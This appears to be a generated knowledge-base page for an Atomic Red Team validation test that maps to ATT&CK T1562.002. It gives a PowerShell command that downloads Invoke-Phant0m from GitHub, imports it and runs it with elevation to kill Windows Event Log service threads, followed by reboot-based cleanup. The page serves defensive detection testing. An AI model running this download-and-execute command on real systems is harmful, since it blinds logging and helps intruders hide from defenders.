---
atomic_guid: "41ac52ba-5d5e-40c0-b267-573ed90489bd"
title: "Kill Event Log Service Threads"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.002"
attack_technique_name: "Impair Defenses: Disable Windows Event Logging"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "41ac52ba-5d5e-40c0-b267-573ed90489bd"
  - "Kill Event Log Service Threads"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Kill Event Log Service Threads

Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html

## Metadata

- Atomic GUID: 41ac52ba-5d5e-40c0-b267-573ed90489bd
- Technique: T1562.002: Impair Defenses: Disable Windows Event Logging
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1562.002/T1562.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.002]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
$output = "$env:TEMP\Invoke-Phant0m.ps1"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m
```

### Cleanup

```powershell
Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" -fore red
Remove-Item "$env:TEMP\Invoke-Phant0m.ps1" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.yaml)
